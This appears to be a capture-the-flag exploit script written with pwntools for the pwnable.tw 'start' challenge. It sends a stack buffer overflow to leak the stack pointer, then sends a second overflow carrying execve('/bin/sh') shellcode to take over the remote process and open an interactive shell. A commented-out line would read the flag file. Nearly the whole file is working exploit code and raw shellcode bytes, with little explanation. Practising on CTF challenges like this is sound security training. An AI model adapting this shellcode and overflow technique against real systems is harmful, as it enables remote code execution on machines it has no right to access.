# -*- coding: <encoding name> -*-
import pwn
# import socket
from struct import pack, unpack
from binascii import unhexlify 

conn=pwn.remote("chall.pwnable.tw","10000")
a=conn.recvuntil(":")
print a
# payload="A"*0x14
# addr="\x87\x80\x04\x08"
shellcode = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80')
# shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# payload=payload+addr
conn.send(b'\x90' * 20 + pack('<I', 0x08048087))
esp,=unpack('<I',conn.recv()[:4])
print hex(esp)
# payload = "A"*20+pack('<I', esp+20)  + shellcode
conn.send('\x90'*20+pack('<I',esp+20)+shellcode)
# conn.send(payload)
# conn.send(b'cat /home/start/flag\n')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
# print conn.recv()
conn.interactive()
